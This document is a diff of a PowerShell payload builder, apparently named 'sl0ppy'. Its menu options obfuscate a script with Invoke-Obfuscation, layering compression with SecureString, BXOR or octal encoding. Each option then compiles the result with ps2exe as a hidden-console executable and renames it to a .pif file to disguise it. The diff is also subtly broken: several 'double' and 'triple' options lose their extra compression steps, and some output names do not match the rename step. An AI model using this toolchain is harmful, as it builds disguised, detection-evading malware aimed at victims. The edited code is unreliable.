@@ -45,46 +45,46 @@ do
     {
     '1' {
     'You chose option Compression+SecureString+Output'
-	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\5,encoding\5,encoding\5,out C:\sl0ppy-payload\output.ps1'
-	Add-Content -NoNewline -path C:\sl0ppy-payload\output.ps1 "powershell "  
-	Add-Content -NoNewline -path C:\sl0ppy-payload\output.ps1 '$()'
-	ps2exe.ps1 -inputFile C:\sl0ppy-payload\output.ps1 -outputFile C:\sl0ppy-payload\test.exe -noConsole -noError -title "sl0ppy-test" -version 0.0.0.1
-	rename-Item -Path "C:\sl0ppy-payload\test.exe" -NewName "C:\sl0ppy-payload\test.pif"	
+	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\5,encoding\5,encoding\5,out C:\sl0ppy-payload\sl0ppy-css-output.ps1'
+	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-css-output.ps1 "powershell "  
+	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-css-output.ps1 '$()'
+	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-css-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-css.exe -noConsole -noError -title "sl0ppy-css" -version 0.0.0.1
+	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-css.exe" -NewName "C:\sl0ppy-payload\sl0ppy-css.pif"	
     } '2' {
     'You chose option Dubble-Compression+SecureString+Output'
-	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\5,compress\1,encoding\5,encoding\5,out C:\sl0ppy-payload\output.ps1'
-	Add-Content -NoNewline -path C:\sl0ppy-payload\output.ps1 "powershell "  
-	Add-Content -NoNewline -path C:\sl0ppy-payload\output.ps1 '$()'
-	ps2exe.ps1 -inputFile C:\sl0ppy-payload\output.ps1 -outputFile C:\sl0ppy-payload\test.exe -noConsole -noError -title "sl0ppy-test" -version 0.0.0.1
-	rename-Item -Path "C:\sl0ppy-payload\test.exe" -NewName "C:\sl0ppy-payload\test.pif"	
+	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\5,encoding\5,encoding\5,out C:\sl0ppy-payload\sl0ppy-dcss-output.ps1'
+	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-dcss-output.ps1 "powershell "  
+	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-dcss-output.ps1 '$()'
+	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-dcss-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-dcss.exe -noConsole -noError -title "sl0ppy-dcss" -version 0.0.0.1
+	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-dcss.exe" -NewName "C:\sl0ppy-payload\sl0ppy-dcss.pif"	
     } '3' {
     'You chose option Tripple-Compression+SecureString+Output'
-	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\5,compress\1,encoding\5,compress\1,encoding\5,out C:\sl0ppy-payload\output.ps1'
-	Add-Content -NoNewline -path C:\sl0ppy-payload\output.ps1 "powershell "  
-	Add-Content -NoNewline -path C:\sl0ppy-payload\output.ps1 '$()'
-	ps2exe.ps1 -inputFile C:\sl0ppy-payload\output.ps1 -outputFile C:\sl0ppy-payload\test.exe -noConsole -noError -title "sl0ppy-test" -version 0.0.0.1
-	rename-Item -Path "C:\sl0ppy-payload\test.exe" -NewName "C:\sl0ppy-payload\test.pif"	
+	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\5,encoding\5,encoding\5,out C:\sl0ppy-payload\sl0ppy-tcss-output.ps1'
+	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-tcss-output.ps1 "powershell "  
+	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-tcss-output.ps1 '$()'
+	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-tcss-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-tcss.exe -noConsole -noError -title "sl0ppy-tcss" -version 0.0.0.1
+	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-tcss.exe" -NewName "C:\sl0ppy-payload\sl0ppy-tcss.pif"	
     } '4' {
     'You chose option Compression+BXOR+Output'
-	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\6,encoding\6,encoding\6,out C:\sl0ppy-payload\output.ps1'
-	Add-Content -NoNewline -path C:\sl0ppy-payload\output.ps1 "powershell "  
-	Add-Content -NoNewline -path C:\sl0ppy-payload\output.ps1 '$()'
-	ps2exe.ps1 -inputFile C:\sl0ppy-payload\output.ps1 -outputFile C:\sl0ppy-payload\test.exe -noConsole -noError -title "sl0ppy-test" -version 0.0.0.1
-	rename-Item -Path "C:\sl0ppy-payload\test.exe" -NewName "C:\sl0ppy-payload\test.pif"	
+	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\6,encoding\6,encoding\6,out C:\sl0ppy-payload\sl0ppy-bc-output.ps1'
+	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-bc-output.ps1 "powershell "  
+	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-bc-output.ps1 '$()'
+	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-bc-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-bc.exe -noConsole -noError -title "sl0ppy-bc" -version 0.0.0.1
+	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-bc.exe" -NewName "C:\sl0ppy-payload\sl0ppy-bc.pif"	
     } '5' {
     'You chose option Dubble-Compression+BXOR+Output'
-	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\6,compress\1,encoding\6,encoding\6,out C:\sl0ppy-payload\output.ps1'
-	Add-Content -NoNewline -path C:\sl0ppy-payload\output.ps1 "powershell "  
-	Add-Content -NoNewline -path C:\sl0ppy-payload\output.ps1 '$()'
-	ps2exe.ps1 -inputFile C:\sl0ppy-payload\output.ps1 -outputFile C:\sl0ppy-payload\test.exe -noConsole -noError -title "sl0ppy-test" -version 0.0.0.1
-	rename-Item -Path "C:\sl0ppy-payload\test.exe" -NewName "C:\sl0ppy-payload\test.pif"	
+	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\6,encoding\6,encoding\6,out C:\sl0ppy-payload\sl0ppy-dbc-output.ps1'
+	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-dbc-output.ps1 "powershell "  
+	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-dbc-output.ps1 '$()'
+	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-dbc-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-bc.exe -noConsole -noError -title "sl0ppy-dcb" -version 0.0.0.1
+	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-dbc.exe" -NewName "C:\sl0ppy-payload\sl0ppy-dbc.pif"
     } '6' {
     'You chose option Tripple-Compression+BXOR+Output'
-    Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\6,compress\1,encoding\6,compress\1,encoding\6,out C:\sl0ppy-payload\output.ps1'
-    Add-Content -NoNewline -path C:\sl0ppy-payload\output.ps1 "powershell "  
-    Add-Content -NoNewline -path C:\sl0ppy-payload\output.ps1 '$()'
-    ps2exe.ps1 -inputFile C:\sl0ppy-payload\output.ps1 -outputFile C:\sl0ppy-payload\test.exe -noConsole -noError -title "sl0ppy-test" -version 0.0.0.1
-    rename-Item -Path "C:\sl0ppy-payload\test.exe" -NewName "C:\sl0ppy-payload\test.pif"    
+	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\6,encoding\6,encoding\6,out C:\sl0ppy-payload\sl0ppy-tbc-output.ps1'
+	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-tbc-output.ps1 "powershell "  
+	Add-Content -NoNewline -path C:\sl0ppy-payload\sl0ppy-tbc-output.ps1 '$()'
+	ps2exe.ps1 -inputFile C:\sl0ppy-payload\sl0ppy-tbc-output.ps1 -outputFile C:\sl0ppy-payload\sl0ppy-tc.exe -noConsole -noError -title "sl0ppy-tcb" -version 0.0.0.1
+	rename-Item -Path "C:\sl0ppy-payload\sl0ppy-tbc.exe" -NewName "C:\sl0ppy-payload\sl0ppy-tbc.pif"  
     } '7' {
     'You chose option Compression+Octal+Output'
 	Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation -scriptpath {C:\sl0ppy-oppg-main\1.ps1} -command 'compress\1,encoding\3,encoding\3,encoding\3,out C:\sl0ppy-payload\output.ps1'
